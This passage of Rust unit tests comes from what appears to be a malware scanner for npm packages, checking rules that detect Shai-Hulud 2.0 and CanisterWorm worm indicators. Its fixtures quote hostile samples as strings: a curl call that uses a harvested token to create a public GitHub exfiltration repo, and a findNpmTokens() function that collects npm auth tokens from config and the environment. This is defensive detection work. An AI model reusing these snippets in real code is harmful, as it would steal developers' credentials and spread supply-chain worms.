    // WORM-11 (file level): GitHub exfil repo creation in bundled script
    //
    // Gap fixed: WORM-11 previously only fired from hook body strings.
    // Shai-Hulud 2.0's bun_environment.js creates the exfil repo
    // ("Sha1-Hulud: The Second Coming." description) from a bundled file.
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm11_file_level_github_repo_create_in_bundled_file() {
        // Exact pattern from Shai-Hulud 2.0 bun_environment.js
        let src = r#"execSync('curl -s -H "Authorization: Bearer ' + token + '" https://api.github.com/user/repos -d \'{"name":"a1b2c3","description":"Sha1-Hulud: The Second Coming.","private":false}\'');"#;
        let findings = scan_files_only(vec![make_file(
            "bun_environment.js",
            FileKind::Javascript,
            src,
        )]);
        assert!(
            has_rule(&findings, "WORM_GITHUB_REPO_CREATE_IN_HOOK"),
            "WORM-11 file-level: api.github.com/user/repos in bundled file must fire; findings: {findings:#?}"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WORM_FIND_NPM_TOKENS: CanisterWorm canonical token-harvest function
    //
    // New detection. CanisterWorm's deploy.js defines `findNpmTokens()` as its
    // canonical token-harvesting helper. The function name is a definitive IOC
    // (worms-2025.md §4.1 WORM-03d): zero false-positive rate in any legitimate
    // npm package. Was entirely missing before this fix.
    // ═══════════════════════════════════════════════════════════════════════

    #[test]
    fn worm_find_npm_tokens_function_definition_in_deploy_js() {
        // The canonical form from CanisterWorm deploy.js
        let src = r#"
function findNpmTokens() {
    const tokens = [];
    try {
        const cfg = execSync('npm config get', { encoding: 'utf8' });
        (cfg.match(/_authToken\s*=\s*(.+)/g) || []).forEach(m => tokens.push(m.split('=')[1].trim()));
    } catch (_) {}
    if (process.env.NPM_TOKEN) tokens.push(process.env.NPM_TOKEN);
    return tokens;
}
"#;
        let findings = scan_files_only(vec![make_file("deploy.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_FIND_NPM_TOKENS"),
            "WORM_FIND_NPM_TOKENS: must detect findNpmTokens function definition; findings: {findings:#?}"
        );
        assert!(
            has_severity(&findings, "WORM_FIND_NPM_TOKENS", Severity::High),
            "WORM_FIND_NPM_TOKENS: must be High severity"
        );
    }

    #[test]
    fn worm_find_npm_tokens_function_call() {
        // A call to findNpmTokens() (not just definition) must also fire
        let src = "const tokens = findNpmTokens(); if (!tokens.length) process.exit(0);";
        let findings = scan_files_only(vec![make_file("index.js", FileKind::Javascript, src)]);
        assert!(
            has_rule(&findings, "WORM_FIND_NPM_TOKENS"),
            "WORM_FIND_NPM_TOKENS: must detect findNpmTokens() call; findings: {findings:#?}"
        );
    }

    #[test]
    fn worm_find_npm_tokens_not_triggered_by_similar_name() {
        // "getTokens" or "findTokens" (without "Npm") must NOT trigger this rule —
        // the \b boundary and exact name ensure specificity.
        let src = r#"
function findTokens(service) { return tokens[service]; }
function getTokens() { return db.query('SELECT * FROM tokens'); }
"#;
        let findings = scan_files_only(vec![make_file("auth.js", FileKind::Javascript, src)]);
        assert!(
            !has_rule(&findings, "WORM_FIND_NPM_TOKENS"),
            "similar function names must NOT trigger WORM_FIND_NPM_TOKENS; findings: {findings:#?}"
        );
    }
}
